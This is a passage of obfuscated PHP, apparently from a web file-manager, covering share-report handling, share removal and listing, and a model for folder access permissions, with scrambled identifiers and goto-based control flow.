$cùß¸œÃ¼ï = $this->_folderReport($Aµ‰öîâÈ); if (!$cùß¸œÃ¼ï) { return; } show_json(LNG($aÊèâ‹“±¹[1826]) . $aÊèâ‹“±¹[1827] . $cùß¸œÃ¼ï, !1); } $d‘—ÕöÇªø = Model($aÊèâ‹“±¹[776])->fileInfoGet($aİí¬äò¡£[$aÊèâ‹“±¹[84]][$aÊèâ‹“±¹[390]]); if (!$d‘—ÕöÇªø) { return; } goto B‹ëğ©ñİØ; EÒ—«÷àŸØ: $aÊèâ‹“±¹ =& $_SERVER[ÉóçÄÇ]; if ($D¢š²ÒÛæ[$aÊèâ‹“±¹[467]] != $aÊèâ‹“±¹[86]) { return; } $Aµ‰öîâÈ = $aİí¬äò¡£[$aÊèâ‹“±¹[84]][$aÊèâ‹“±¹[390]]; goto E”³‡¥èõ³; BĞô¥ƒñëù: } private function _folderReport($a–©®Ü¯ô) { goto C™­ÁªåŠ; eÙæ»é»¬: if (!$Eš¼ë‹¢Á) { return !1; } $Eš¼ë‹¢Á = array_to_keyvalue($Eš¼ë‹¢Á, $D¯ë¦¥ÒŒó[33], $D¯ë¦¥ÒŒó[441]); $fØÚÍ¾Š¾¿ = $D¯ë¦¥ÒŒó[47] . $a–©®Ü¯ô . $D¯ë¦¥ÒŒó[47]; goto D÷ˆ¯Š„ğÏ; C™­ÁªåŠ: $D¯ë¦¥ÒŒó =& $_SERVER[ÉóçÄÇ]; $aÒùÙáèĞŞ = array($D¯ë¦¥ÒŒó[441] => array($D¯ë¦¥ÒŒó[951], 0), $D¯ë¦¥ÒŒó[711] => 3); $Eš¼ë‹¢Á = Model($D¯ë¦¥ÒŒó[1829])->where($aÒùÙáèĞŞ)->field($D¯ë¦¥ÒŒó[441])->select(); goto eÙæ»é»¬; aÎ¯„Õ¯‰™: $CŒ£‘ïà‘ä = substr($Fâñ¥•ÓÒ¯[$D¯ë¦¥ÒŒó[481]], strpos($Fâñ¥•ÓÒ¯[$D¯ë¦¥ÒŒó[481]], $fØÚÍ¾Š¾¿)); $aÒùÙáèĞŞ = array($D¯ë¦¥ÒŒó[390] => array($D¯ë¦¥ÒŒó[7], trim($CŒ£‘ïà‘ä, $D¯ë¦¥ÒŒó[47]))); $bºÎôõĞã¬ = Model($D¯ë¦¥ÒŒó[776])->where($aÒùÙáèĞŞ)->field($D¯ë¦¥ÒŒó[28])->select(); goto FÁ®ÇÕ´Ü; D÷ˆ¯Š„ğÏ: $aÒùÙáèĞŞ = array($D¯ë¦¥ÒŒó[441] => array($D¯ë¦¥ÒŒó[7], $Eš¼ë‹¢Á), $D¯ë¦¥ÒŒó[481] => array($D¯ë¦¥ÒŒó[378], "\45{$fØÚÍ¾Š¾¿}\x25"), $D¯ë¦¥ÒŒó[417] => 0); $Fâñ¥•ÓÒ¯ = Model($D¯ë¦¥ÒŒó[776])->where($aÒùÙáèĞŞ)->field($D¯ë¦¥ÒŒó[1830])->find(); if (!$Fâñ¥•ÓÒ¯) { return !1; } goto aÎ¯„Õ¯‰™; FÁ®ÇÕ´Ü: $Aòòİ¨¯º¤ = array_to_keyvalue($bºÎôõĞã¬, $D¯ë¦¥ÒŒó[33], $D¯ë¦¥ÒŒó[28]); $Aòòİ¨¯º¤[] = $Fâñ¥•ÓÒ¯[$D¯ë¦¥ÒŒó[28]]; return implode($D¯ë¦¥ÒŒó[8], $Aòòİ¨¯º¤); goto bÄ…—¡´á; bÄ…—¡´á: } protected function remove($EĞ Ÿ¢«) { goto dŠƒŒÃÍ; C‡†óÚ: for ($fÈ„”†Í†÷ = 0; $fÈ„”†Í†÷ < count($C É©­âíÓ); $fÈ„”†Í†÷++) { $f¶‡ŠÛÜõÌ = $this->getInfo($C É©­âíÓ[$fÈ„”†Í†÷]); if ($f¶‡ŠÛÜõÌ[$c•ÁÅì„ù[469]] == $c•ÁÅì„ù[86]) { Model($c•ÁÅì„ù[528])->eventShare($f¶‡ŠÛÜõÌ[$c•ÁÅì„ù[390]], $c•ÁÅì„ù[1819]); } if ($f¶‡ŠÛÜõÌ[$c•ÁÅì„ù[467]] == $c•ÁÅì„ù[86]) { Model($c•ÁÅì„ù[528])->eventShare($f¶‡ŠÛÜõÌ[$c•ÁÅì„ù[390]], $c•ÁÅì„ù[1818]); } } return $bÖ‚”™‹; goto D‡…›íé‘õ; aÀ®ÏÁ: $bÖ‚”™‹ = $this->where($f¯ˆ¢‘¡Â)->delete(); if ($bÖ‚”™‹) { Model($c•ÁÅì„ù[559])->where(array($c•ÁÅì„ù[462] => $EĞ Ÿ¢«))->delete(); } $C É©­âíÓ = is_array($EĞ Ÿ¢«) ? $EĞ Ÿ¢«[1] : array($EĞ Ÿ¢«); goto C‡†óÚ; dŠƒŒÃÍ: $c•ÁÅì„ù =& $_SERVER[ÉóçÄÇ]; if (is_array($EĞ Ÿ¢«)) { $EĞ Ÿ¢« = array($c•ÁÅì„ù[7], $EĞ Ÿ¢«); } $f¯ˆ¢‘¡Â = array($c•ÁÅì„ù[462] => $EĞ Ÿ¢«); goto aÀ®ÏÁ; D‡…›íé‘õ: } protected function removeBySource($bóôŞ‹ˆĞ) { goto D–¾š„ŠÉ‹; f°¨¨…áµÎ: $this->where($eÚ÷ƒÇ‡°Ü)->delete(); Model($b½Ô‹ñ§ÕÈ[559])->where($eÚ÷ƒÇ‡°Ü)->delete(); goto fÓÏ½ŸğÃ; cÌ–‹‹Óïƒ: $D·ğ×«Â• = array_to_keyvalue($D·ğ×«Â•, $b½Ô‹ñ§ÕÈ[33], $b½Ô‹ñ§ÕÈ[462]); if (!$D·ğ×«Â•) { return; } $eÚ÷ƒÇ‡°Ü = array($b½Ô‹ñ§ÕÈ[461] => array($b½Ô‹ñ§ÕÈ[405], $D·ğ×«Â•)); goto f°¨¨…áµÎ; D–¾š„ŠÉ‹: $b½Ô‹ñ§ÕÈ =& $_SERVER[ÉóçÄÇ]; $eÚ÷ƒÇ‡°Ü = array($b½Ô‹ñ§ÕÈ[404] => array($b½Ô‹ñ§ÕÈ[405], $bóôŞ‹ˆĞ)); $D·ğ×«Â• = $this->field($b½Ô‹ñ§ÕÈ[462])->where($eÚ÷ƒÇ‡°Ü)->select(); goto cÌ–‹‹Óïƒ; fÓÏ½ŸğÃ: } public function listAll($fñÊì´Â•Š) { goto a´§ø†›¤£; B®ÂÓÈ—Ê: if ($fñÊì´Â•Š[$c™­‰ó¹¹ã[724]]) { $e‰Øë¥–š† = $fñÊì´Â•Š[$c™­‰ó¹¹ã[470]] ? $fñÊì´Â•Š[$c™­‰ó¹¹ã[470]] : strtotime(date($c™­‰ó¹¹ã[1831])); $D¢Ë§¼ƒÆ[$c™­‰ó¹¹ã[192]] = array($c™­‰ó¹¹ã[329], array($fñÊì´Â•Š[$c™­‰ó¹¹ã[724]], $e‰Øë¥–š†)); } if ($fñÊì´Â•Š[$c™­‰ó¹¹ã[29]]) { $D¢Ë§¼ƒÆ[$fñÊì´Â•Š[$c™­‰ó¹¹ã[29]]] = 1; } else { $D¢Ë§¼ƒÆ[] = array($c™­‰ó¹¹ã[467] => array($c™­‰ó¹¹ã[951], 0), $c™­‰ó¹¹ã[469] => array($c™­‰ó¹¹ã[951], 0), $c™­‰ó¹¹ã[1808] => $c™­‰ó¹¹ã[1762]); } if ($fñÊì´Â•Š[$c™­‰ó¹¹ã[1758]]) { $D¢Ë§¼ƒÆ[] = array($c™­‰ó¹¹ã[464] => $fñÊì´Â•Š[$c™­‰ó¹¹ã[1758]], $c™­‰ó¹¹ã[1414] => array($c™­‰ó¹¹ã[378], "\45{$fñÊì´Â•Š[$c™­‰ó¹¹ã[1758]]}\x25"), $c™­‰ó¹¹ã[1808] => $c™­‰ó¹¹ã[1762]); } goto Fâ“‰‘–è; a´§ø†›¤£: $c™­‰ó¹¹ã =& $_SERVER[ÉóçÄÇ]; $D¢Ë§¼ƒÆ = array(); if ($fñÊì´Â•Š[$c™­‰ó¹¹ã[1511]]) { $D¢Ë§¼ƒÆ[$c™­‰ó¹¹ã[1511]] = $fñÊì´Â•Š[$c™­‰ó¹¹ã[1511]]; } goto B®ÂÓÈ—Ê; eê§ãµÜ•İ: return $bâ çêö‘„; goto Dœ‰ï¬‹œ¬; Fâ“‰‘–è: $bâ çêö‘„ = $this->_makeOrder()->where($D¢Ë§¼ƒÆ)->selectPage(20); if (empty($bâ çêö‘„[$c™­‰ó¹¹ã[365]])) { return array(); } $this->_listDataApply($bâ çêö‘„[$c™­‰ó¹¹ã[365]]); goto eê§ãµÜ•İ; Dœ‰ï¬‹œ¬: } public function listDataApply($F§Ú…ƒÈéË) { $this->_listDataApply($F§Ú…ƒÈéË); return $F§Ú…ƒÈéË; } private function _listDataApply(&$CîœÔ™Ø÷”) { goto D…ÑåÙ¦è‡; eè¤ëçÑ³“: unset($b™Û¤œˆäñ); goto eİ£˜ŞœÎ; D…ÑåÙ¦è‡: $fóÓÕ±¿® =& $_SERVER[ÉóçÄÇ]; $dÓíÃ¾®õ = array_to_keyvalue($CîœÔ™Ø÷”, $fóÓÕ±¿®[33], $fóÓÕ±¿®[1511]); $DºëŞßá—î = Model($fóÓÕ±¿®[501])->userListInfo(array_unique($dÓíÃ¾®õ)); goto CŠìàŠ¯Å‘; CŠìàŠ¯Å‘: $AÚ°“—îÖÈ = array_to_keyvalue($CîœÔ™Ø÷”, $fóÓÕ±¿®[33], $fóÓÕ±¿®[390]); $a®®’å½À = Model($fóÓÕ±¿®[776])->sourceListInfo($AÚ°“—îÖÈ, !0); foreach ($CîœÔ™Ø÷” as &$b™Û¤œˆäñ) { $eòç•–ÍŠ‰ = $b™Û¤œˆäñ[$fóÓÕ±¿®[1511]]; $b™Û¤œˆäñ[$fóÓÕ±¿®[1832]] = $DºëŞßá—î[$eòç•–ÍŠ‰] ? $DºëŞßá—î[$eòç•–ÍŠ‰] : !1; $F˜ñ¾‚àˆ = $b™Û¤œˆäñ[$fóÓÕ±¿®[390]]; $b™Û¤œˆäñ[$fóÓÕ±¿®[84]] = $a®®’å½À[$F˜ñ¾‚àˆ] ? $a®®’å½À[$F˜ñ¾‚àˆ] : !1; } goto eè¤ëçÑ³“; eİ£˜ŞœÎ: } private function _makeOrder($eÌ‚£ëÔ›¢ = '') { goto Bï‰Ä³ÂŸ¤; fäµšëÚœ: $aÕ‹ä‡µÇ£ = Input::get($dö§Æ×À´ó[429], $dö§Æ×À´ó[7], $dö§Æ×À´ó[410], $EƒÄ…­ÌÏ„); $cİÉÖå™•‚ = Input::get($dö§Æ×À´ó[430], $dö§Æ×À´ó[7], $dö§Æ×À´ó[1833], array($dö§Æ×À´ó[1757], $dö§Æ×À´ó[424])); $cİÉÖå™•‚ = $FÇæø‹ö°[$cİÉÖå™•‚]; goto aÁ¨³Î«±; Bï‰Ä³ÂŸ¤: $dö§Æ×À´ó =& $_SERVER[ÉóçÄÇ]; $EƒÄ…­ÌÏ„ = array($dö§Æ×À´ó[192], $dö§Æ×À´ó[470], $dö§Æ×À´ó[1821], $dö§Æ×À´ó[1822]); $FÇæø‹ö° = array($dö§Æ×À´ó[422] => $dö§Æ×À´ó[423], $dö§Æ×À´ó[424] => $dö§Æ×À´ó[425]); goto fäµšëÚœ; aÁ¨³Î«±: $eÌ‚£ëÔ›¢ = $eÌ‚£ëÔ›¢ . "{$aÕ‹ä‡µÇ£}\x20{$cİÉÖå™•‚}"; return $this->order($eÌ‚£ëÔ›¢); goto C‘£”¿¸Ç®; C‘£”¿¸Ç®: } public function reportAdd($aòÔğÅâßÃ) { $e‘™ßµ†® =& $_SERVER[ÉóçÄÇ]; $eÒä¬¥†¿Œ = array($e‘™ßµ†®[462] => $aòÔğÅâßÃ[$e‘™ßµ†®[462]], $e‘™ßµ†®[1511] => USER_ID); if (Model($e‘™ßµ†®[1829])->where($eÒä¬¥†¿Œ)->find()) { return !1; } $c²ÆƒÈ×© = array($e‘™ßµ†®[462] => $aòÔğÅâßÃ[$e‘™ßµ†®[462]], $e‘™ßµ†®[1414] => $aòÔğÅâßÃ[$e‘™ßµ†®[1414]], $e‘™ßµ†®[390] => $aòÔğÅâßÃ[$e‘™ßµ†®[390]], $e‘™ßµ†®[441] => $aòÔğÅâßÃ[$e‘™ßµ†®[441]], $e‘™ßµ†®[1511] => USER_ID, $e‘™ßµ†®[29] => $aòÔğÅâßÃ[$e‘™ßµ†®[29]], $e‘™ßµ†®[425] => $aòÔğÅâßÃ[$e‘™ßµ†®[425]]); return Model($e‘™ßµ†®[1829])->add($c²ÆƒÈ×©); } public function reportList($D‚¹èŸ…È™) { goto càô »›—; E·àé¢ÂĞÓ: if (isset($D‚¹èŸ…È™[$B¦øºÆ˜¬[29]]) && in_array($D‚¹èŸ…È™[$B¦øºÆ˜¬[29]], array($B¦øºÆ˜¬[86], $B¦øºÆ˜¬[1834], $B¦øºÆ˜¬[1835], $B¦øºÆ˜¬[1836], $B¦øºÆ˜¬[1837]))) { $DĞ…›®ª‹´[$B¦øºÆ˜¬[29]] = $D‚¹èŸ…È™[$B¦øºÆ˜¬[29]]; } if (isset($D‚¹èŸ…È™[$B¦øºÆ˜¬[711]]) && in_array($D‚¹èŸ…È™[$B¦øºÆ˜¬[711]], array($B¦øºÆ˜¬[491], $B¦øºÆ˜¬[86], $B¦øºÆ˜¬[1834], $B¦øºÆ˜¬[1835]))) { $DĞ…›®ª‹´[$B¦øºÆ˜¬[711]] = $D‚¹èŸ…È™[$B¦øºÆ˜¬[711]]; } $eŸˆ³øöË‘ = Input::get($B¦øºÆ˜¬[430], $B¦øºÆ˜¬[7], $B¦øºÆ˜¬[1833], array($B¦øºÆ˜¬[1757], $B¦øºÆ˜¬[424])); goto aßÍˆ‡®ƒ; f–âÆ¹š½: if (empty($fØ²§‘×Üˆ[$B¦øºÆ˜¬[365]])) { return array(); } $this->_listDataApply($fØ²§‘×Üˆ[$B¦øºÆ˜¬[365]]); return $fØ²§‘×Üˆ; goto cÒ½­£Û«; càô »›—: $B¦øºÆ˜¬ =& $_SERVER[ÉóçÄÇ]; $DĞ…›®ª‹´ = array(); if ($D‚¹èŸ…È™[$B¦øºÆ˜¬[724]]) { $fœÏ¾”ß¢é = $D‚¹èŸ…È™[$B¦øºÆ˜¬[470]] ? $D‚¹èŸ…È™[$B¦øºÆ˜¬[470]] : strtotime(date($B¦øºÆ˜¬[1831])); $DĞ…›®ª‹´[$B¦øºÆ˜¬[192]] = array($B¦øºÆ˜¬[329], array($D‚¹èŸ…È™[$B¦øºÆ˜¬[724]], $fœÏ¾”ß¢é)); } goto E·àé¢ÂĞÓ; aßÍˆ‡®ƒ: $C—äŠŒİ¦Ï = array($B¦øºÆ˜¬[422] => $B¦øºÆ˜¬[423], $B¦øºÆ˜¬[424] => $B¦øºÆ˜¬[425]); $FÄöš··Ü¿ = $B¦øºÆ˜¬[1838] . $C—äŠŒİ¦Ï[$eŸˆ³øöË‘]; $fØ²§‘×Üˆ = Model($B¦øºÆ˜¬[1829])->where($DĞ…›®ª‹´)->order($FÄöš··Ü¿)->selectPage(20); goto f–âÆ¹š½; cÒ½­£Û«: } public function reportStatus($d‹‘¢‡§ãİ) { goto a øàçĞõ; FÊ¶†‘™ªÜ: return $F‰„µŠ³éâ; goto BÑŸÏºõ°; a øàçĞõ: $fĞ±ä‚»å =& $_SERVER[ÉóçÄÇ]; $C¥ÑÜ÷Š¸Ê = array($fĞ±ä‚»å[388] => $d‹‘¢‡§ãİ[$fĞ±ä‚»å[388]]); $cĞñ¹Î…âœ = Model($fĞ±ä‚»å[1829])->where($C¥ÑÜ÷Š¸Ê)->field($fĞ±ä‚»å[1839])->find(); goto A¦”‰Û‡¬; Eööœ¶ãšö: $F‰„µŠ³éâ = Model($fĞ±ä‚»å[1829])->where($C¥ÑÜ÷Š¸Ê)->save($Bì¤Ëê„Ğ›); if ($d‹‘¢‡§ãİ[$fĞ±ä‚»å[711]] == $fĞ±ä‚»å[1834]) { if ($cĞñ¹Î…âœ[$fĞ±ä‚»å[441]] != $fĞ±ä‚»å[491] && $this->shareFileMeta($cĞñ¹Î…âœ[$fĞ±ä‚»å[441]])) { $this->shareFileMeta($cĞñ¹Î…âœ[$fĞ±ä‚»å[441]], 0); } $this->remove($cĞñ¹Î…âœ[$fĞ±ä‚»å[462]]); return !0; } if ($F‰„µŠ³éâ && $d‹‘¢‡§ãİ[$fĞ±ä‚»å[711]] == $fĞ±ä‚»å[1835]) { $aÇ°´œÏŸ = $Bì¤Ëê„Ğ›[$fĞ±ä‚»å[711]] == $fĞ±ä‚»å[1835] ? 1 : 0; $this->shareFileMeta($cĞñ¹Î…âœ[$fĞ±ä‚»å[441]], $aÇ°´œÏŸ); $this->removeByFile($cĞñ¹Î…âœ[$fĞ±ä‚»å[441]]); } goto FÊ¶†‘™ªÜ; A¦”‰Û‡¬: if (!$cĞñ¹Î…âœ) { return !1; } $Bì¤Ëê„Ğ› = array($fĞ±ä‚»å[711] => $d‹‘¢‡§ãİ[$fĞ±ä‚»å[711]]); if ($d‹‘¢‡§ãİ[$fĞ±ä‚»å[711]] == $fĞ±ä‚»å[1835] && $cĞñ¹Î…âœ[$fĞ±ä‚»å[711]] == $fĞ±ä‚»å[1835]) { $Bì¤Ëê„Ğ›[$fĞ±ä‚»å[711]] = 0; } goto Eööœ¶ãšö; BÑŸÏºõ°: } private function removeByFile($E²×ê›ñ“¯) { goto bšÊ¬çƒæ¢; e£¼æÂ²¼„: $f¼Ì¨‹Ãµª = array($BÉù ›¸«™[390] => array($BÉù ›¸«™[7], $E²ë‘Â´×), $BÉù ›¸«™[467] => 1); $C•¿¶î¥ß¡ = Model($BÉù ›¸«™[1651])->where($f¼Ì¨‹Ãµª)->field($BÉù ›¸«™[462])->select(); if (empty($C•¿¶î¥ß¡)) { return; } goto Bè¨–™ª«; Bè¨–™ª«: $Eâ±…ˆòëŞ = array_to_keyvalue($C•¿¶î¥ß¡, $BÉù ›¸«™[33], $BÉù ›¸«™[462]); $this->remove($Eâ±…ˆòëŞ); goto dàÂÎ“‰á; bšÊ¬çƒæ¢: $BÉù ›¸«™ =& $_SERVER[ÉóçÄÇ]; $C•¿¶î¥ß¡ = Model($BÉù ›¸«™[776])->where(array($BÉù ›¸«™[441] => $E²×ê›ñ“¯))->field($BÉù ›¸«™[390])->select(); $E²ë‘Â´× = array_to_keyvalue($C•¿¶î¥ß¡, $BÉù ›¸«™[33], $BÉù ›¸«™[390]); goto e£¼æÂ²¼„; dàÂÎ“‰á: } private function shareFileMeta($E…Î¹ùÓ´ , $d¾‰´”Ë¢‘ = null) { $FÌôŠœçÎ =& $_SERVER[ÉóçÄÇ]; $Aùáª×íğ„ = array($FÌôŠœçÎ[441] => $E…Î¹ùÓ´ , $FÌôŠœçÎ[92] => $FÌôŠœçÎ[1840]); if (is_null($d¾‰´”Ë¢‘)) { return Model($FÌôŠœçÎ[1841])->where($Aùáª×íğ„)->find(); } $Aùáª×íğ„[$FÌôŠœçÎ[370]] = $d¾‰´”Ë¢‘; Model($FÌôŠœçÎ[1841])->add($Aùáª×íğ„, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\163\x6f\165\162\143\x65\x5f\x61\x75\x74\x68"; public function getAuth($A¼¤ˆ²ÌÎŒ) { goto e½‰îÎù§¾; e½‰îÎù§¾: $F»³Ÿ‚‘Í¬ =& $_SERVER[ÉóçÄÇ]; $Dù³·Ï©‹ = $this->sourceAuthSelect($A¼¤ˆ²ÌÎŒ); $EÒñ™ÏÊíÂ = array(); goto EˆË­Äô¬³; c´ÒøâöÄŸ: array_multisort($b…ÌæÅ¾æ, SORT_DESC, $EÒñ™ÏÊíÂ); return $EÒñ™ÏÊíÂ; goto e‰‡ÒŠÇÙ–; EˆË­Äô¬³: $b…ÌæÅ¾æ = array(); $cŠ‰§Ê†­ø = 2 << 25; foreach ($Dù³·Ï©‹ as $Cœ¤Şİ£†‘) { goto A†Ó¯ñ†Ğ ; f³§ÑÀ‹¦‡: $fŞ×Ê‚ª = 0; if ($Cœ¤Şİ£†‘[$F»³Ÿ‚‘Í¬[398]] == SourceModel::TYPE_GROUP) { $fŞ×Ê‚ª = $cŠ‰§Ê†­ø * 2; } if ($Cœ¤Şİ£†‘[$F»³Ÿ‚‘Í¬[398]] == SourceModel::TYPE_USER) { $fŞ×Ê‚ª = $cŠ‰§Ê†­ø; } goto FéŞ£§§½™; FéŞ£§§½™: if ($Cœ¤Şİ£†‘[$F»³Ÿ‚‘Í¬[398]] == SourceModel::TYPE_USER && $Cœ¤Şİ£†‘[$F»³Ÿ‚‘Í¬[478]] == $F»³Ÿ‚‘Í¬[491]) { $fŞ×Ê‚ª = 0; } $b…ÌæÅ¾æ[] = $B£ÛòêÏ¯[$F»³Ÿ‚‘Í¬[400]] + $fŞ×Ê‚ª; goto d‡îòŸ“ÖÚ; A†Ó¯ñ†Ğ : $B£ÛòêÏ¯ = Model($F»³Ÿ‚‘Í¬[1842])->listData($Cœ¤Şİ£†‘[$F»³Ÿ‚‘Í¬[1770]]); if (!$B£ÛòêÏ¯) { continue; } $EÒñ™ÏÊíÂ[] = $Cœ¤Şİ£†‘; goto f³§ÑÀ‹¦‡; d‡îòŸ“ÖÚ: } goto c´ÒøâöÄŸ; e‰‡ÒŠÇÙ–: } public function sourceAuthSelect($c“¥Ë¤µïŞ) { goto aÊíì’õÆ·; EÔ°Œ•Æğ¹: if (count($e»ìÅÑÖ Ç) == count($c“¥Ë¤µïŞ)) { return $f¾œ˜æõ×¢ ? $e»ìÅÑÖ Ç[$c“¥Ë¤µïŞ[0]] : $e»ìÅÑÖ Ç; } $bÂƒ”±…à¹ = $DãØ…©§„[1843]; $c´œÂ†¤ = array($DãØ…©§„[390] => array($DãØ…©§„[7], $c“¥Ë¤µïŞ)); goto D²é›äÇÛÍ; Fæ‡„æ™¾: if ($f¾œ˜æõ×¢) { $c“¥Ë¤µïŞ = array($c“¥Ë¤µïŞ); } $e»ìÅÑÖ Ç = array(); foreach ($c“¥Ë¤µïŞ as $C®ŠëŒ¿”­) { if (isset($bÌ¼™¼ª…[$C®ŠëŒ¿”­])) { $e»ìÅÑÖ Ç[$C®ŠëŒ¿”­] = $bÌ¼™¼ª…[$C®ŠëŒ¿”­]; } } goto EÔ°Œ•Æğ¹; D²é›äÇÛÍ: $B»•§µ¯ê” = $this->field($bÂƒ”±…à¹)->order($DãØ…©§„[388])->where($c´œÂ†¤)->select(); $dø­æÔ«Ë = array_to_keyvalue_group($B»•§µ¯ê”, $DãØ…©§„[390]); foreach ($c“¥Ë¤µïŞ as $C®ŠëŒ¿”­) { $bÌ¼™¼ª…[$C®ŠëŒ¿”­] = $dø­æÔ«Ë[$C®ŠëŒ¿”­] ? $dø­æÔ«Ë[$C®ŠëŒ¿”­] : array(); } goto cÚâ˜Œ«Íó; cÚâ˜Œ«Íó: if ($f¾œ˜æõ×¢) { return $B»•§µ¯ê”; } return $dø­æÔ«Ë; goto eñãâğÄì; aÊíì’õÆ·: $DãØ…©§„ =& $_SERVER[ÉóçÄÇ]; static $bÌ¼™¼ª… = array(); $f¾œ˜æõ×¢ = is_array($c“¥Ë¤µïŞ) ? !1 : !0; goto Fæ‡„æ™¾; eñãâğÄì: } public function setAuth($b¾ø®áö†ä, $Fá‡É°ÉÄğ) { goto aã¶¹çß•º; fùÏÒ¡×ó¾: if ($c«†©‹¤‡[$Aœó¤¾¯è·[398]] != SourceModel::TYPE_GROUP) { return !1; } $F÷çÁ‹ºÏ½ = 1; $dçË±õÜ® = $c«†©‹¤‡[$Aœó¤¾¯è·[478]]; goto c¢îÏÅ¾…ë; c¢îÏÅ¾…ë: if ($dçË±õÜ® != $F÷çÁ‹ºÏ½) { $C®¾õÇ«°á = array($Aœó¤¾¯è·[1674] => $dçË±õÜ®); $D×©Èå…‚ = Model($Aœó¤¾¯è·[1756])->field($Aœó¤¾¯è·[1511])->where($C®¾õÇ«°á)->select(); $D×©Èå…‚ = array_to_keyvalue($D×©Èå…‚, $Aœó¤¾¯è·[33], $Aœó¤¾¯è·[1511]); } $cêÅ ±•‡ˆ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $a÷É¹å†µ… = array(); goto dŠà—Çóåç; aã¶¹çß•º: $Aœó¤¾¯è· =& $_SERVER[ÉóçÄÇ]; $c«†©‹¤‡ = Model($Aœó¤¾¯è·[1186])->sourceInfo($b¾ø®áö†ä); if (!$c«†©‹¤‡) { return !1; } goto fùÏÒ¡×ó¾; aíœï·š‡: return !0; goto eŠº÷©Šåâ; dŠà—Çóåç: foreach ($Fá‡É°ÉÄğ as $fŞ® œÁî‡) { if (!in_array($fŞ® œÁî‡[$Aœó¤¾¯è·[398]], $cêÅ ±•‡ˆ)) { show_json(LNG($Aœó¤¾¯è·[1844]), !1); } if ($dçË±õÜ® != $F÷çÁ‹ºÏ½) { if ($fŞ® œÁî‡[$Aœó¤¾¯è·[398]] == SourceModel::TYPE_GROUP) { } if ($fŞ® œÁî‡[$Aœó¤¾¯è·[478]] != 0 && !in_array($fŞ® œÁî‡[$Aœó¤¾¯è·[478]], $D×©Èå…‚)) { } } if ($fŞ® œÁî‡[$Aœó¤¾¯è·[478]] == 0) { $fŞ® œÁî‡[$Aœó¤¾¯è·[398]] = SourceModel::TYPE_USER; } $a÷É¹å†µ…[] = array($Aœó¤¾¯è·[390] => $b¾ø®áö†ä, $Aœó¤¾¯è·[398] => intval($fŞ® œÁî‡[$Aœó¤¾¯è·[398]]), $Aœó¤¾¯è·[478] => intval($fŞ® œÁî‡[$Aœó¤¾¯è·[478]]), $Aœó¤¾¯è·[1770] => intval($fŞ® œÁî‡[$Aœó¤¾¯è·[1770]]) ? intval($fŞ® œÁî‡[$Aœó¤¾¯è·[1770]]) : 0, $Aœó¤¾¯è·[1824] => intval($fŞ® œÁî‡[$Aœó¤¾¯è·[1824]]) ? intval($fŞ® œÁî‡[$Aœó¤¾¯è·[1824]]) : -1); } $this->where(array($Aœó¤¾¯è·[404] => $b¾ø®áö†ä))->delete(); $this->addAll($a÷É¹å†µ…); goto aíœï·š‡; eŠº÷©Šåâ: } public function authClear($Bµ±Ú³Š¡Ş) { $aùİ •°¶’ =& $_SERVER[ÉóçÄÇ]; $eÂÓ‰è‘Çì = Model($aùİ •°¶’[1186])->sourceInfo($Bµ±Ú³Š¡Ş); $e¨Çˆ‰‰Òğ = array($Bµ±Ú³Š¡Ş); if ($eÂÓ‰è‘Çì[$aùİ •°¶’[397]] == $aùİ •°¶’[86]) { $fæ®½Êñ’ó = array($aùİ •°¶’[548] => array($aùİ •°¶’[507], $eÂÓ‰è‘Çì[$aùİ •°¶’[481]] . $Bµ±Ú³Š¡Ş . $aùİ •°¶’[508])); $e¨Çˆ‰‰Òğ = Model($aùİ •°¶’[1186])->field($aùİ •°¶’[404])->where($fæ®½Êñ’ó)->getField($aùİ •°¶’[390], !0); $e¨Çˆ‰‰Òğ[] = $Bµ±Ú³Š¡Ş; } $this->where(array($aùİ •°¶’[404] => array($aùİ •°¶’[405], $e¨Çˆ‰‰Òğ)))->delete(); return !0; } public function getAllChildren($d¾Ÿ’„Òì) { goto D¨øÎì¹ìõ; b„¦äˆç‹: if ($ağ…ä¬§£Ä[$EåöÃ“è†[472]] == $EåöÃ“è†[491] && $ağ…ä¬§£Ä[$EåöÃ“è†[478]] != $dˆ×¸½’ãì) { $eæ©ÖÂ¯¤â = $this->groupChidldAllRootSource($ağ…ä¬§£Ä[$EåöÃ“è†[478]]); } $fŸÖã£µ´Ø = $this->field($EåöÃ“è†[390])->group($EåöÃ“è†[390])->select(); $fŸÖã£µ´Ø = array_to_keyvalue($fŸÖã£µ´Ø, $EåöÃ“è†[33], $EåöÃ“è†[390]); goto Eß¡ƒ†Õ´; D™“¸©Òë³: $DÀùá¢¢’ù = Model($EåöÃ“è†[776])->field($D¶¶Ô¿¶)->where($Bê©ùõí°)->select(); $FÀ½²Óç· = array($d¾Ÿ’„Òì); foreach ($DÀùá¢¢’ù as $C˜ö™­¦) { foreach ($eæ©ÖÂ¯¤â as $aŸØˆØ‹”Ë) { $cğøóêì¥ø = $EåöÃ“è†[47] . $aŸØˆØ‹”Ë . $EåöÃ“è†[47]; $C‰Ş·ê“ã = $C˜ö™­¦[$EåöÃ“è†[481]] . $C˜ö™­¦[$EåöÃ“è†[390]] . $EåöÃ“è†[47]; if (strstr($C‰Ş·ê“ã, $cğøóêì¥ø)) { $FÀ½²Óç·[] = $C˜ö™­¦[$EåöÃ“è†[390]]; break; } } } goto E‘ä÷•è´È; E‘ä÷•è´È: return $this->sourceListAuth($FÀ½²Óç·); goto d¥ø›ÊÓ; D¨øÎì¹ìõ: $EåöÃ“è† =& $_SERVER[ÉóçÄÇ]; $ağ…ä¬§£Ä = Model($EåöÃ“è†[1186])->sourceInfo($d¾Ÿ’„Òì); if ($ağ…ä¬§£Ä[$EåöÃ“è†[397]] != $EåöÃ“è†[86]) { return $this->sourceListAuth(array($d¾Ÿ’„Òì)); } goto AóŒ‘; Eß¡ƒ†Õ´: if (!$fŸÖã£µ´Ø) { return array(); } $D¶¶Ô¿¶ = $EåöÃ“è†[1845]; $Bê©ùõí° = array($EåöÃ“è†[390] => array($EåöÃ“è†[7], $fŸÖã£µ´Ø), $EåöÃ“è†[417] => $EåöÃ“è†[491]); goto D™“¸©Òë³; AóŒ‘: if ($ağ…ä¬§£Ä[$EåöÃ“è†[398]] != SourceModel::TYPE_GROUP) { return array(); } $dˆ×¸½’ãì = 1; $eæ©ÖÂ¯¤â = array($d¾Ÿ’„Òì); goto b„¦äˆç‹; d¥ø›ÊÓ: } private function sourceListAuth($fŸ‹Æ§¼´•) { goto dÚ£—ˆºïÛ; bƒ³Ùá–Ş™: $bŸÙÇä = array(); 